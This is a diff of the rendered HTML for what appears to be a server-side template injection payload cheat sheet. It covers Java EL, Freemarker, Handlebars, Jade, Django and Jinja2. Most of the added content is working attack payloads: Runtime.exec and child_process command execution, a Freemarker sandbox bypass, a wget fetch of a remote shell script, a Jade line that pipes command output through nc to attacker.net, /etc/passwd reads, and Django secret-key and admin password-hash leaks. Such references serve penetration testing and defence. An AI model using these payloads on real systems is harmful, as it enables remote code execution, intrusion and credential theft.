+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">()[</span><span style="color:#ae81ff">6</span><span style="color:#f92672">].</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>whoami<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using ScriptEngineManager one-liner
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.script.ScriptEngineManager&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getEngineByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;js&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">eval</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(\\\&#34;ping x.x.x.x\\\&#34;)&#34;</span><span style="color:#f92672">))}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using JavaClass
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>whoami<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">x</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Method using ScriptEngineManager
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$<span style="color:#f92672">{</span>facesContext<span style="color:#f92672">.</span><span style="color:#a6e22e">getExternalContext</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setResponseHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;output&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javax.script.ScriptEngineManager&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getEngineByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;JavaScript&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">eval</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;var x=new java.lang.ProcessBuilder;x.command(\\\&#34;wget\\\&#34;,\\\&#34;http://x.x.x.x/1.sh\\\&#34;);org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&#34;</span><span style="color:#f92672">))}</span>
@@ -1771,7 +1914,12 @@ https://github.com/alex-shpak/hugo-book
   Freemarker - Basic injection
   <a class="anchor" href="#freemarker---basic-injection">#</a>
 </h3>
-<p>The template can be <code>${3*3}</code> or the legacy <code>#{3*3}</code>.</p>
+<p>The template can be :</p>
+<ul>
+<li>Default: <code>${3*3}</code></li>
+<li>Legacy: <code>#{3*3}</code></li>
+<li>Alternative: <code>[=3*3]</code> since <a href="https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html">FreeMarker 2.3.4</a></li>
+</ul>
 <h3 id="freemarker---read-file">
   Freemarker - Read File
   <a class="anchor" href="#freemarker---read-file">#</a>
@@ -1785,12 +1933,13 @@ https://github.com/alex-shpak/hugo-book
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()<span style="color:#f92672">&gt;</span><span style="color:#a6e22e">$</span>{ <span style="color:#a6e22e">ex</span>(<span style="color:#e6db74">&#34;id&#34;</span>)}
 </span></span><span style="display:flex;"><span>[<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;freemarker.template.utility.Execute&#39;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()]<span style="color:#a6e22e">$</span>{ <span style="color:#a6e22e">ex</span>(<span style="color:#e6db74">&#39;id&#39;</span>)}
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;id&#34;</span>)}
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;id&#34;</span>)]
 </span></span></code></pre></div><h3 id="freemarker---sandbox-bypass">
   Freemarker - Sandbox bypass
   <a class="anchor" href="#freemarker---sandbox-bypass">#</a>
 </h3>
 <p>:warning: only works on Freemarker versions below 2.3.30</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">classloader</span><span style="color:#f92672">=</span><span style="color:#a6e22e">article</span>.<span style="color:#66d9ef">class</span>.<span style="color:#a6e22e">protectionDomain</span>.<span style="color:#a6e22e">classLoader</span><span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">classloader</span><span style="color:#f92672">=</span><span style="color:#a6e22e">article</span>.<span style="color:#66d9ef">class</span>.<span style="color:#a6e22e">protectionDomain</span>.<span style="color:#a6e22e">classLoader</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">owc</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.ObjectWrapper&#34;</span>)<span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">dwf</span><span style="color:#f92672">=</span><span style="color:#a6e22e">owc</span>.<span style="color:#a6e22e">getField</span>(<span style="color:#e6db74">&#34;DEFAULT_WRAPPER&#34;</span>).<span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">null</span>)<span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span>)<span style="color:#f92672">&gt;</span>
@@ -1844,11 +1993,30 @@ https://github.com/alex-shpak/hugo-book
 <blockquote>
 <p>Handlebars compiles templates into JavaScript functions.</p>
 </blockquote>
-<h3 id="need-bugfix-for-handlebars">
-  NEED BUGFIX FOR HANDLEBARS
-  <a class="anchor" href="#need-bugfix-for-handlebars">#</a>
+<h3 id="handlebars---command-execution">
+  Handlebars - Command Execution
+  <a class="anchor" href="#handlebars---command-execution">#</a>
 </h3>
-<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-handlebars" data-lang="handlebars"><span style="display:flex;"><span><span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> <span style="color:#e6db74">&#34;s&#34;</span> as <span style="color:#960050;background-color:#1e0010">|</span>string<span style="color:#960050;background-color:#1e0010">|</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> <span style="color:#e6db74">&#34;e&#34;</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> split as <span style="color:#960050;background-color:#1e0010">|</span>conslist<span style="color:#960050;background-color:#1e0010">|</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span>this.push <span style="color:#960050;background-color:#1e0010">(</span>lookup string.sub <span style="color:#e6db74">&#34;constructor&#34;</span><span style="color:#960050;background-color:#1e0010">)</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> string.split as <span style="color:#960050;background-color:#1e0010">|</span>codelist<span style="color:#960050;background-color:#1e0010">|</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span>this.push <span style="color:#e6db74">&#34;return require(&#39;child_process&#39;).execSync(&#39;ls -la&#39;);&#34;</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span>this.pop<span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span><span style="color:#66d9ef">#each</span> conslist<span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#75715e">{{</span><span style="color:#66d9ef">#with</span> <span style="color:#960050;background-color:#1e0010">(</span>string.sub.apply <span style="color:#ae81ff">0</span> codelist<span style="color:#960050;background-color:#1e0010">)</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">{{</span>this<span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">{{</span><span style="color:#66d9ef">/each</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">{{</span><span style="color:#66d9ef">/with</span><span style="color:#75715e">}}</span>
+</span></span></code></pre></div><hr>
 <h2 id="jade--codepen">
   Jade / Codepen
   <a class="anchor" href="#jade--codepen">#</a>
@@ -1860,7 +2028,6 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>mainModule<span style="color:#f92672">.</span>require
 </span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> x <span style="color:#f92672">=</span> x(<span style="color:#e6db74">&#39;child_process&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#39;id | nc attacker.net 80&#39;</span>)
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span>{<span style="color:#a6e22e">root</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">mainModule</span>.<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>).<span style="color:#a6e22e">spawnSync</span>(<span style="color:#e6db74">&#39;cat&#39;</span>, [<span style="color:#e6db74">&#39;/etc/passwd&#39;</span>]).<span style="color:#a6e22e">stdout</span>}
 </span></span></code></pre></div><hr>
 <h2 id="java">
   Java
@@ -1874,14 +2041,11 @@ https://github.com/alex-shpak/hugo-book
 <p>Multiple variable expressions can be used, if <code>${...}</code> doesn&rsquo;t work try <code>#{...}</code>, <code>*{...}</code>, <code>@{...}</code> or <code>~{...}</code>.</p>
 </blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>$<span style="color:#f92672">{{</span><span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">}}</span>
 </span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getClassLoader</span><span style="color:#f92672">()}</span>
 </span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getPath</span><span style="color:#f92672">()}</span>
 </span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>class<span style="color:#f92672">.</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;../../../../../index.htm&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getContent</span><span style="color:#f92672">()}</span>
-</span></span></code></pre></div><h3 id="need-bugfix-for-some-java">
-  NEED BUGFIX FOR SOME JAVA
-  <a class="anchor" href="#need-bugfix-for-some-java">#</a>
-</h3>
-<h3 id="java---retrieve-the-systems-environment-variables">
+</span></span></code></pre></div><h3 id="java---retrieve-the-systems-environment-variables">
   Java - Retrieve the system’s environment variables
   <a class="anchor" href="#java---retrieve-the-systems-environment-variables">#</a>
 </h3>
@@ -1890,7 +2054,7 @@ https://github.com/alex-shpak/hugo-book
   Java - Retrieve /etc/passwd
   <a class="anchor" href="#java---retrieve-etcpasswd">#</a>
 </h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>cat etc<span style="color:#f92672">/</span>passwd<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>cat <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)}</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>org<span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">commons</span><span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOUtils</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Runtime</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">99</span><span style="color:#f92672">).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">97</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">116</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">32</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">101</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">116</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">99</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">47</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">112</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">97</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">115</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">115</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">119</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Character</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">(</span><span style="color:#ae81ff">100</span><span style="color:#f92672">))).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">())}</span>
 </span></span></code></pre></div><hr>
@@ -1899,11 +2063,53 @@ https://github.com/alex-shpak/hugo-book
   <a class="anchor" href="#django-templates">#</a>
 </h2>
 <p>Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.</p>
-<h3 id="need-bugfix-for-django">
-  NEED BUGFIX FOR DJANGO
-  <a class="anchor" href="#need-bugfix-for-django">#</a>
+<h3 id="detection">
+  Detection
+  <a class="anchor" href="#detection">#</a>
 </h3>
-<h2 id="jinja2">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> }}  <span style="color:#75715e"># Error with Django Templates</span>
+</span></span><span style="display:flex;"><span>ih0vr{{<span style="color:#ae81ff">364</span><span style="color:#f92672">|</span>add:<span style="color:#ae81ff">733</span>}}d121r <span style="color:#75715e"># Burp Payload -&gt; ih0vr1097d121r</span>
+</span></span></code></pre></div><h3 id="django-templates-for-post-exploitation">
+  Django Templates for post-exploitation
+  <a class="anchor" href="#django-templates-for-post-exploitation">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Variables</span>
+</span></span><span style="display:flex;"><span>{{ variable }}
+</span></span><span style="display:flex;"><span>{{ variable<span style="color:#f92672">.</span>attr }}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Filters</span>
+</span></span><span style="display:flex;"><span>{{ value<span style="color:#f92672">|</span>length }}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tags</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> csrf_token <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><h3 id="cross-site-scripting">
+  Cross-site scripting
+  <a class="anchor" href="#cross-site-scripting">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&lt;script&gt;alert(3)&lt;/script&gt;&#39;</span> }}
+</span></span><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&lt;script&gt;alert(3)&lt;/script&gt;&#39;</span> <span style="color:#f92672">|</span> safe }}
+</span></span></code></pre></div><h3 id="debug-information-leak">
+  Debug information leak
+  <a class="anchor" href="#debug-information-leak">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> debug <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><h3 id="leaking-apps-secret-key">
+  Leaking app’s Secret Key
+  <a class="anchor" href="#leaking-apps-secret-key">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ messages<span style="color:#f92672">.</span>storages<span style="color:#ae81ff">.0</span><span style="color:#f92672">.</span>signer<span style="color:#f92672">.</span>key }}
+</span></span></code></pre></div><h3 id="admin-site-url-leak">
+  Admin Site URL leak
+  <a class="anchor" href="#admin-site-url-leak">#</a>
+</h3>
+<pre tabindex="0"><code>{% include &#39;admin/base.html&#39; %}
+</code></pre><h3 id="admin-username-and-password-hash-leak">
+  Admin username and password hash leak
+  <a class="anchor" href="#admin-username-and-password-hash-leak">#</a>
+</h3>
+<pre tabindex="0"><code>{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+</code></pre><h2 id="jinja2">
   Jinja2
   <a class="anchor" href="#jinja2">#</a>
 </h2>
@@ -1911,11 +2117,143 @@ https://github.com/alex-shpak/hugo-book
 <blockquote>
 <p>Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.</p>
 </blockquote>
-<h3 id="need-bugfix-for-jinja2">
-  NEED BUGFIX FOR JINJA2
-  <a class="anchor" href="#need-bugfix-for-jinja2">#</a>
+<h3 id="jinja2---basic-injection">
+  Jinja2 - Basic injection
+  <a class="anchor" href="#jinja2---basic-injection">#</a>
 </h3>
-<hr>
